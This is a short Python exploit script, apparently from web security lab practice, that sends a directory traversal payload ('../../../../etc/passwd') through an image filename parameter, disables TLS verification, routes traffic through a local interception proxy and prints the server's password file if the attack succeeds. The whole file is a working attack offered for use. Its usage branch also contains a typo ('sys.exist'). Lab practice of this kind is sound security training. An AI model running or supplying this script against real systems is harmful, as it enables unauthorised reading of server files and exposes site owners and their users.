import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal(url):
    image_url = url + '/image/?filename=../../../../etc/passwd'
    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print("(+) Exploit worked!")
        print("(+) Following is the contents:")
        print(r.text)
    else:
        print("(+) Exploit failed. Try again.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exist(-1)

    url = sys.argv[1]
    print("(+) Exploiting the directory traversal at", url)
    directory_traversal(url)  

if __name__ == "__main__":
    main()
